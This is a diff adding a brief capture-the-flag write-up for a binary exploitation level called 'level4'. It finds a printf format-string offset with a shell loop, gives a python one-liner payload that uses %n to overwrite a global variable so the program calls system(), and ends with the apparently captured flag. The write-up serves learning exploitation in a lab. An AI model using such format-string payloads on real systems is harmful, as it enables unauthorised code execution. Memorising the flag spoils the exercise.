@@ -1,0 +1,16 @@
+We have in this level printf function, so we will formatting breach.
+In order to execute the system function in the n function we have to put 0x1025544 as value of the global variable m.
+So, with printf, we should modify the value of this variable (m).
+
+1- find the address of our input
+
+for((i=0;i<200;i++));do echo "Index $i" && echo "AAAA%$i\$x" | ./level4 ; done | grep -B1 41414141
+Index 12
+AAAA41414141
+
+Offset = 12
+
+2- we have use the formater %n of printf because it writes the number of characters to be printed, so we have to put 0x1025544 characters.
+we print 16930112 address of the memory
+python -c "print('\x10\x98\x04\x08' + '%16930112x%12\$n')" | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
